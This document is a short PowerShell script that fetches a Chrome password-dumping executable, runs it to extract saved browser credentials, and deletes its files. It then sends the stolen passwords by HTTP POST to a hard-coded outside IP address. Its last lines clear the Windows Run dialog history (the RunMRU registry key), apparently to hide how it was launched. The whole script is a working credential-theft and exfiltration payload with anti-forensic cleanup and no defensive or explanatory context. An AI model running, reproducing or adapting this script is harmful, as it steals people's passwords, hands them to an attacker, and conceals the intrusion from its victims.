$username = $env:UserName;
$url = "https://github.com/BudiNverse/chrome-pwd-dumper-rs/releases/download/0.3.0/chrome-pwd-dumper.exe";
$path = "C:\Users\{0}\AppData\Local\Temp\" -f $username;
Set-Location $path;
Invoke-WebRequest -Uri $url -OutFile "cpd.exe";
$cmd = ".\cpd.exe -f json x";
Invoke-Expression $cmd;
Remove-Item ".\cpd.exe";
$data = (Get-Content ".\x.json");
Remove-Item ".\x.json";
Invoke-WebRequest -Uri "http://3.92.185.85/" -Method POST -Body $data;

$path = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU";
$arr = Get-ItemPropertyValue $path -Name MRUList;
Set-ItemProperty -Path $path -Name MRUList -Value "";
foreach ($x in $arr.ToCharArray()) {
    Remove-ItemProperty -Path $path -Name $x;
}
